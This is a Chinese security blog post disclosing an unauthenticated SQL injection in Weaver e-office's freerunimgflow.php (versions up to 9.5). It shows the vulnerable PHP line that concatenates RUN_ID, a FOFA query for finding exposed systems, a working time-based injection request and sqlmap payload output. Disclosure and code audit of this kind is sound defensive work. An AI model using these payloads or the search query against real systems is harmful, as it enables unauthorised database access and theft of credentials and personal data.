---
title: "泛微e-office freerunimgflow.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-workflow-freerunimgflow-sqli.html
asset_dir: assets/泛微e-office-freerunimgflow.php-sql注入漏洞
---

# 泛微e-office freerunimgflow.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/14 18:27
- 888浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

计算机安全

sql

Microsoft Office

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office freerunimgflow.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/workflow/freerunimgflow.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/img_flow.inc.php" );
include_once( "inc/img_patten.inc.php" );
$connection = openconnection( );
$sql = "\r\n        SELECT PRCS_ID FROM flow_run_prcs \r\n\t\t   WHERE RUN_ID=".$_REQUEST['RUN_ID']." \r\n\t\t     GROUP BY PRCS_ID ASC \r\n         ";
$res = exequery( $connection, $sql );
```

`RUN_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

深入探索

Web安全课程

JSON处理工具

网络安全培训

# 漏洞复现

```
GET /general/workflow/freerunimgflow.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
```

[![泛微e-office freerunimgflow.php sql注入漏洞](images/img-001-7f75ad3cb603.webp)](https://image.mrxn.net/ef6164bd2e274cc3bd66556a72b0536e.webp)

成功在延时 5 秒

编程

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 378 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: RUN_ID=1 AND 4540=4540

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
